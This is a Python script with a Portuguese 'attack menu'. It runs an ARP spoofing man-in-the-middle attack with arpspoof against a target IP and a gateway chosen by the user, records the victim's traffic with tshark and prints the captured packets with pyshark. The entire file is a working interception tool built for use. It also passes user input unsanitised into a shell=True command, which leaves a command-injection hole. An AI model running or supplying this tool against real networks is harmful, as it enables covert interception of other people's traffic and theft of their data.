import subprocess
import time
import os

def menu():
    print("\n--- MENU DE ATAQUES ---")
    print("1. ARP Spoofing")
    print("2. Sair")

def coletar_dados():
    iface = input("Digite a interface de rede (ex: eth0 ou wlan0): ")
    target_ip = input("Digite o IP da máquina alvo: ")
    gateway_ip = input("Digite o IP do gateway (roteador): ")
    return iface, target_ip, gateway_ip

def iniciar_captura(iface, arquivo_pcap):
    print("\n[+] Iniciando captura de pacotes com tshark...")
    return subprocess.Popen(["tshark", "-i", iface, "-w", arquivo_pcap])

def parar_captura(captura_process):
    print("[+] Parando captura...")
    captura_process.terminate()

def executar_ataque_arp(target_ip, gateway_ip, iface):
    print("\n[+] Executando ataque ARP Spoofing...")
    comando = f"xterm -e arpspoof -i {iface} -t {target_ip} {gateway_ip}"
    subprocess.call(comando, shell=True)

def analisar_pcap(arquivo_pcap):
    print("\n[+] Iniciando análise básica com pyshark...")
    try:
        import pyshark
        cap = pyshark.FileCapture(arquivo_pcap)
        for pkt in cap[:10]:
            print(pkt)
        cap.close()
    except ImportError:
        print("Pyshark não instalado. Use: pip install pyshark")

def main():
    while True:
        menu()
        escolha = input("\nEscolha o ataque: ")

        if escolha == "1":
            iface, target_ip, gateway_ip = coletar_dados()
            arquivo_pcap = "captura_ataque.pcap"

            captura_process = iniciar_captura(iface, arquivo_pcap)

            time.sleep(3)  # Espera alguns segundos antes do ataque
            executar_ataque_arp(target_ip, gateway_ip, iface)

            input("\nPressione ENTER para parar a captura e seguir com a análise...")

            parar_captura(captura_process)
            analisar_pcap(arquivo_pcap)

        elif escolha == "2":
            print("Saindo...")
            break

        else:
            print("Opção inválida.")

if __name__ == "__main__":
    main()
